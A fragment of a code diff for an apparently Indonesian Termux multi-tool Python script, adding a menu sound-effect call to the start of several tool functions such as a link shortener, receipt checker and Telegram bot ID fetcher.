     from datetime import datetime
@@ -13862,6 +14208,7 @@ def tool_cek_bot_telegram():
     input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")
 
 def tool_link_shortener():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, requests, threading
     
@@ -13997,6 +14344,7 @@ def tool_link_shortener():
     input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")
 
 def tool_Hack_status_wa():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, shutil, threading
     from datetime import datetime
@@ -14159,6 +14507,7 @@ def tool_Hack_status_wa():
     input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")
 
 def tool_cek_resi():
+    play_menu_sound()
     pantau_aktivitas()
     import os, sys, time, requests, threading
     
@@ -14347,6 +14696,7 @@ def tool_cek_resi():
     input(f"{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")
 
 def tool_get_bot_id():
+    play_menu_sound()
     import os, sys, time, requests, threading, json
     from datetime import datetime
     
@@ -14505,6 +14855,7 @@ def tool_get_bot_id():
     input(f"\n{U}❯❯❯ {W}Tekan {R}Enter{W} untuk kembali...{N}")
 
 def tool_theme_termux():
+    play_menu_sound()
     import os, sys, time, subprocess, threading
     
     os.system('clear')
